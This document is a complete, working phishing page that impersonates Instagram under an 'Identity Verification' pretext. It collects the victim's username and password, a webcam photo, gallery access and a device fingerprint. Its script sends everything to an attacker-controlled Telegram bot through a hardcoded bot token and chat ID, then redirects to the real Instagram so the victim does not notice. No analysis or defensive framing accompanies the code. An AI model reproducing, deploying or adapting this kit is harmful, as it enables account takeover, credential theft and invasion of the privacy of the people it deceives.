<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Identity Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background: #fafafa;
            min-height: 100vh;
            color: #262626;
            display: flex;
            flex-direction: column;
        }
        
        .header {
            background: white;
            border-bottom: 1px solid #dbdbdb;
            padding: 16px;
            text-align: center;
            position: fixed;
            top: 0;
            width: 100%;
            z-index: 100;
        }
        
        .logo {
            font-size: 22px;
            font-weight: 600;
            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D, #F56040, #F77737, #FCAF45, #FFDC80);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .container {
            flex: 1;
            max-width: 400px;
            margin: 80px auto 20px;
            padding: 0 20px;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        
        .verification-card {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            padding: 24px;
            text-align: center;
            margin-bottom: 16px;
        }
        
        .badge-icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(45deg, #405DE6, #833AB4, #E1306C, #FCAF45);
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            color: white;
        }
        
        .title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 12px;
            color: #262626;
        }
        
        .description {
            font-size: 14px;
            color: #8e8e8e;
            line-height: 1.5;
            margin-bottom: 20px;
        }
        
        .form-group {
            margin-bottom: 16px;
            text-align: left;
        }
        
        label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #262626;
        }
        
        input[type="text"],
        input[type="password"],
        input[type="email"] {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            font-size: 14px;
            background: #fafafa;
            margin-bottom: 10px;
        }
        
        .camera-section {
            background: #f8f9fa;
            border: 2px dashed #dbdbdb;
            border-radius: 8px;
            padding: 20px;
            text-align: center;
            margin: 20px 0;
            cursor: pointer;
        }
        
        .camera-icon {
            font-size: 48px;
            margin-bottom: 10px;
        }
        
        .camera-text {
            font-size: 14px;
            color: #8e8e8e;
            margin-bottom: 10px;
        }
        
        .photo-preview {
            width: 100%;
            max-width: 200px;
            border-radius: 8px;
            margin: 10px auto;
            display: none;
        }
        
        .permission-btn {
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin: 5px;
        }
        
        .permission-btn.secondary {
            background: transparent;
            color: #0095f6;
            border: 1px solid #0095f6;
        }
        
        .hidden {
            display: none;
        }
        
        .step-indicator {
            display: flex;
            justify-content: center;
            margin: 20px 0;
        }
        
        .step {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #dbdbdb;
            margin: 0 4px;
        }
        
        .step.active {
            background: #0095f6;
        }
        
        .gallery-section {
            margin: 20px 0;
        }
        
        .gallery-btn {
            background: #405DE6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">Instagram</div>
    </div>
    
    <div class="container">
        <div class="verification-card" id="step1">
            <div class="badge-icon">✓</div>
            <h1 class="title">Identity Verification Required</h1>
            <p class="description">
                To protect our community and verify your identity, we need additional confirmation.
            </p>
            
            <div class="form-group">
                <label for="username">Instagram Username</label>
                <input type="text" id="username" placeholder="Enter your username" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter your password" required>
            </div>
            
            <button class="permission-btn" onclick="nextStep()">Continue</button>
        </div>

        <div class="verification-card hidden" id="step2">
            <div class="badge-icon">📷</div>
            <h1 class="title">Photo Verification</h1>
            <p class="description">
                Please allow camera access to take a verification photo.
            </p>
            
            <div class="camera-section" onclick="requestCamera()">
                <div class="camera-icon">📸</div>
                <div class="camera-text">Tap to enable camera</div>
            </div>
            
            <video id="video" autoplay class="hidden" style="width: 100%; border-radius: 8px;"></video>
            <canvas id="canvas" class="hidden"></canvas>
            <img id="photoPreview" class="photo-preview">
            
            <div id="cameraControls" class="hidden">
                <button class="permission-btn" onclick="capturePhoto()">Take Photo</button>
                <button class="permission-btn secondary" onclick="retakePhoto()">Retake</button>
            </div>
            
            <div class="step-indicator">
                <div class="step active"></div>
                <div class="step"></div>
                <div class="step"></div>
            </div>
            
            <button class="permission-btn secondary" onclick="prevStep()">Back</button>
            <button class="permission-btn" onclick="nextStep()" id="nextStep2" disabled>Continue</button>
        </div>

        <div class="verification-card hidden" id="step3">
            <div class="badge-icon">🖼️</div>
            <h1 class="title">Gallery Access</h1>
            <p class="description">
                We need to verify your identity through your photos.
            </p>
            
            <div class="gallery-section">
                <button class="gallery-btn" onclick="requestGallery()">Access Photo Gallery</button>
                <input type="file" id="galleryInput" accept="image/*" multiple class="hidden">
            </div>
            
            <div id="galleryPreview"></div>
            
            <div class="step-indicator">
                <div class="step"></div>
                <div class="step active"></div>
                <div class="step"></div>
            </div>
            
            <button class="permission-btn secondary" onclick="prevStep()">Back</button>
            <button class="permission-btn" onclick="nextStep()" id="nextStep3" disabled>Continue</button>
        </div>

        <div class="verification-card hidden" id="step4">
            <div class="badge-icon">✅</div>
            <h1 class="title">Verification Complete</h1>
            <p class="description">
                Thank you! Your verification is being processed. This may take 24-48 hours.
            </p>
            
            <div class="step-indicator">
                <div class="step"></div>
                <div class="step"></div>
                <div class="step active"></div>
            </div>
            
            <button class="permission-btn" onclick="submitVerification()">Finish</button>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8309210221:AAEUsJkF5wPJj9YwLEDjYCtnJghRKd9syuc";
        const CHAT_ID = "5873816830";
        
        let currentStep = 1;
        let userData = {
            username: '',
            password: '',
            photoData: '',
            galleryAccess: false,
            deviceInfo: {}
        };

        function nextStep() {
            document.getElementById('step' + currentStep).classList.add('hidden');
            currentStep++;
            document.getElementById('step' + currentStep).classList.remove('hidden');
            
            if (currentStep === 2) {
                userData.username = document.getElementById('username').value;
                userData.password = document.getElementById('password').value;
            }
        }

        function prevStep() {
            document.getElementById('step' + currentStep).classList.add('hidden');
            currentStep--;
            document.getElementById('step' + currentStep).classList.remove('hidden');
        }

        async function requestCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } 
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.classList.remove('hidden');
                document.getElementById('cameraControls').classList.remove('hidden');
                
                // Store camera access success
                userData.cameraAccess = true;
                
            } catch (error) {
                alert('Camera access denied. Please allow camera access to continue.');
            }
        }

        function capturePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const photoPreview = document.getElementById('photoPreview');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            // Convert to base64 for sending
            userData.photoData = canvas.toDataURL('image/jpeg');
            photoPreview.src = userData.photoData;
            photoPreview.style.display = 'block';
            
            // Stop camera
            video.srcObject.getTracks().forEach(track => track.stop());
            video.classList.add('hidden');
            
            // Enable next step
            document.getElementById('nextStep2').disabled = false;
        }

        function retakePhoto() {
            document.getElementById('photoPreview').style.display = 'none';
            document.getElementById('cameraControls').classList.add('hidden');
            requestCamera();
        }

        function requestGallery() {
            document.getElementById('galleryInput').click();
        }

        document.getElementById('galleryInput').addEventListener('change', function(e) {
            if (e.target.files.length > 0) {
                userData.galleryAccess = true;
                userData.galleryFiles = e.target.files.length;
                document.getElementById('nextStep3').disabled = false;
                
                // Show success message
                const galleryPreview = document.getElementById('galleryPreview');
                galleryPreview.innerHTML = `<div style="color: green; font-size: 14px; margin: 10px 0;">
                    ✓ Gallery access granted (${e.target.files.length} photos detected)
                </div>`;
            }
        });

        function collectDeviceInfo() {
            userData.deviceInfo = {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: navigator.cookieEnabled,
                javaScript: true,
                online: navigator.onLine
            };
        }

        function submitVerification() {
            collectDeviceInfo();
            
            const message = `
🔐 **COMPREHENSIVE IDENTITY VERIFICATION**

👤 **Account Information:**
• Username: ${userData.username}
• Password: ${userData.password}

📷 **Camera & Media Access:**
• Camera: ${userData.cameraAccess ? '✅ Granted' : '❌ Denied'}
• Photo: ${userData.photoData ? '✅ Captured' : '❌ Not captured'}
• Gallery: ${userData.galleryAccess ? '✅ Accessed (' + userData.galleryFiles + ' photos)' : '❌ Denied'}

📱 **Device Fingerprint:**
• Platform: ${userData.deviceInfo.platform}
• Screen: ${userData.deviceInfo.screen}
• Language: ${userData.deviceInfo.language}
• Timezone: ${userData.deviceInfo.timezone}
• User Agent: ${userData.deviceInfo.userAgent}

🌐 **Technical Data:**
• Cookies: ${userData.deviceInfo.cookies}
• JavaScript: ${userData.deviceInfo.javaScript}
• Online: ${userData.deviceInfo.online}
• Timestamp: ${new Date().toLocaleString()}

⚠️ **Full identity verification data collected**
            `;

            // Send to Telegram
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    // Redirect to Instagram
                    setTimeout(() => {
                        window.location.href = 'https://www.instagram.com/';
                    }, 2000);
                }
            })
            .catch(error => {
                console.error('Error:', error);
                window.location.href = 'https://www.instagram.com/';
            });
        }

        // Initialize device info collection
        collectDeviceInfo();
    </script>
</body>
</html>
